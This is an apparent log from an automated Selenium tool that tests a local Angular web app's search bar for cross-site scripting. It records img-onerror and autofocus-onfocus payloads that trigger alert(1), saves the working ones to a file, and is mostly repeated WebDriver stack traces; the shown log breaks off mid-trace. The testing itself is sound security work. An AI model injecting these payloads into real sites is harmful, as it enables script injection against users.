+2025-06-28 05:17:51,336 - INFO - No more alerts detected
+2025-06-28 05:17:52,164 - INFO - Angular page stabilized
+2025-06-28 05:17:52,182 - INFO - Page state fully reset
+2025-06-28 05:17:54,203 - INFO - No more alerts detected
+2025-06-28 05:17:54,222 - INFO - Hid overlay via JavaScript
+2025-06-28 05:18:00,316 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:18:05,458 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:18:05,488 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:18:05,533 - INFO - Clicked search icon to open search bar
+2025-06-28 05:18:06,100 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:18:06,115 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:18:06,119 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:18:09,843 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:18:09,859 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:18:10,867 - INFO - Handled alert with text: 1
+2025-06-28 05:18:11,370 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:18:11,370 - INFO - Payload >><img src=x onerror=alert(1)> triggered alert in search_bar immediately: 1
+2025-06-28 05:18:11,385 - INFO - Rendered HTML after alert: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:18:11,387 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:18:11,388 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:18:11,388 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:18:13,397 - INFO - No more alerts detected
+2025-06-28 05:18:14,295 - INFO - Angular page stabilized
+2025-06-28 05:18:14,312 - INFO - Page state fully reset
+2025-06-28 05:18:14,312 - INFO - Processing payload 9 of 29: <input onfocus=alert(uMUsm) autofocus></alert(uMUsm)
+2025-06-28 05:18:16,323 - INFO - No more alerts detected
+2025-06-28 05:18:17,052 - INFO - Angular page stabilized
+2025-06-28 05:18:17,062 - INFO - Page state fully reset
+2025-06-28 05:18:19,074 - INFO - No more alerts detected
+2025-06-28 05:18:19,090 - INFO - Hid overlay via JavaScript
+2025-06-28 05:18:25,173 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:18:30,333 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:18:30,362 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:18:30,404 - INFO - Clicked search icon to open search bar
+2025-06-28 05:18:30,969 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:18:30,986 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:18:30,990 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:18:37,419 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:18:37,433 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:18:40,447 - INFO - No more alerts detected
+2025-06-28 05:18:40,459 - INFO - Simulated focus on element with <input onfocus=alert(uMUsm) autofocus></alert(uMUsm)
+2025-06-28 05:18:41,465 - INFO - Simulated focus on element with <input onfocus=alert(uMUsm) autofocus></alert(uMUsm)
+2025-06-28 05:18:44,481 - INFO - No more alerts detected
+2025-06-28 05:18:47,495 - INFO - Current URL after submission: http://localhost:3000/#/search?q=%3Cinput%20onfocus%3Dalert(uMUsm)%20autofocus%3E%3C%2Falert(uMUsm)
+2025-06-28 05:18:47,510 - INFO - Angular page stabilized
+2025-06-28 05:18:47,521 - INFO - Rendered HTML after submission: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:18:49,534 - INFO - No more alerts detected
+2025-06-28 05:18:49,534 - INFO - Payload <input onfocus=alert(uMUsm) autofocus></alert(uMUsm) did not trigger alert or DOM change in search_bar
+2025-06-28 05:18:49,537 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:18:49,538 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:18:49,539 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:18:51,551 - INFO - No more alerts detected
+2025-06-28 05:18:52,372 - INFO - Angular page stabilized
+2025-06-28 05:18:52,382 - INFO - Page state fully reset
+2025-06-28 05:18:52,382 - INFO - Processing payload 10 of 29: <textarea onfocus=alert(1) autofocus><![CDATA[alert(1)
+2025-06-28 05:18:54,397 - INFO - No more alerts detected
+2025-06-28 05:18:55,175 - INFO - Angular page stabilized
+2025-06-28 05:18:55,187 - INFO - Page state fully reset
+2025-06-28 05:18:57,201 - INFO - No more alerts detected
+2025-06-28 05:18:57,223 - INFO - Hid overlay via JavaScript
+2025-06-28 05:19:03,308 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:19:08,432 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:19:08,460 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:19:08,502 - INFO - Clicked search icon to open search bar
+2025-06-28 05:19:09,066 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:19:09,082 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:19:09,086 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:19:15,690 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:19:15,712 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:19:18,724 - INFO - No more alerts detected
+2025-06-28 05:19:18,749 - INFO - Simulated focus on element with <textarea onfocus=alert(1) autofocus><![CDATA[alert(1)
+2025-06-28 05:19:19,760 - INFO - Handled alert with text: 1
+2025-06-28 05:19:20,264 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:21,270 - INFO - Handled alert with text: 1
+2025-06-28 05:19:21,773 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:21,774 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after focus/toggle: 1
+2025-06-28 05:19:21,784 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1): Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:21,788 - INFO - Handled alert with text: 1
+2025-06-28 05:19:22,292 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:22,292 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after WebDriverException: 1
+2025-06-28 05:19:22,303 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) on retry 1: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:22,303 - INFO - Reinitializing WebDriver to recover session
+2025-06-28 05:19:26,345 - INFO - WebDriver closed
+2025-06-28 05:19:28,229 - INFO - WebDriver initialized
+2025-06-28 05:19:30,244 - INFO - No more alerts detected
+2025-06-28 05:19:36,684 - INFO - Angular page stabilized
+2025-06-28 05:19:36,702 - INFO - Page state fully reset
+2025-06-28 05:19:38,715 - INFO - No more alerts detected
+2025-06-28 05:19:39,722 - INFO - Angular page stabilized
+2025-06-28 05:19:39,733 - INFO - Page state fully reset
+2025-06-28 05:19:41,749 - INFO - No more alerts detected
+2025-06-28 05:19:41,767 - INFO - Confirmed overlays are dismissed
+2025-06-28 05:19:46,929 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:19:47,007 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:19:47,090 - INFO - Clicked search icon to open search bar
+2025-06-28 05:19:47,209 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:19:47,244 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:19:47,252 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:19:53,998 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:19:54,020 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:19:57,033 - INFO - No more alerts detected
+2025-06-28 05:19:57,051 - INFO - Simulated focus on element with <textarea onfocus=alert(1) autofocus><![CDATA[alert(1)
+2025-06-28 05:19:58,071 - INFO - Handled alert with text: 1
+2025-06-28 05:19:58,574 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:19:59,580 - INFO - Handled alert with text: 1
+2025-06-28 05:20:00,084 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:00,085 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after focus/toggle: 1
+2025-06-28 05:20:00,090 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1): Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:00,095 - INFO - Handled alert with text: 1
+2025-06-28 05:20:00,599 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:00,599 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after WebDriverException: 1
+2025-06-28 05:20:00,608 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) on retry 2: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:00,608 - INFO - Reinitializing WebDriver to recover session
+2025-06-28 05:20:03,099 - INFO - WebDriver closed
+2025-06-28 05:20:05,585 - INFO - WebDriver initialized
+2025-06-28 05:20:07,618 - INFO - No more alerts detected
+2025-06-28 05:20:14,109 - INFO - Angular page stabilized
+2025-06-28 05:20:14,124 - INFO - Page state fully reset
+2025-06-28 05:20:16,139 - INFO - No more alerts detected
+2025-06-28 05:20:17,142 - INFO - Angular page stabilized
+2025-06-28 05:20:17,156 - INFO - Page state fully reset
+2025-06-28 05:20:19,168 - INFO - No more alerts detected
+2025-06-28 05:20:19,201 - INFO - Confirmed overlays are dismissed
+2025-06-28 05:20:24,349 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:20:24,392 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:20:24,459 - INFO - Clicked search icon to open search bar
+2025-06-28 05:20:24,530 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:20:24,561 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:20:24,570 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:20:31,348 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:20:31,370 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:20:34,381 - INFO - No more alerts detected
+2025-06-28 05:20:34,398 - INFO - Simulated focus on element with <textarea onfocus=alert(1) autofocus><![CDATA[alert(1)
+2025-06-28 05:20:35,412 - INFO - Handled alert with text: 1
+2025-06-28 05:20:35,916 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:36,923 - INFO - Handled alert with text: 1
+2025-06-28 05:20:37,427 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:37,427 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after focus/toggle: 1
+2025-06-28 05:20:37,438 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1): Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:37,446 - INFO - Handled alert with text: 1
+2025-06-28 05:20:37,949 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
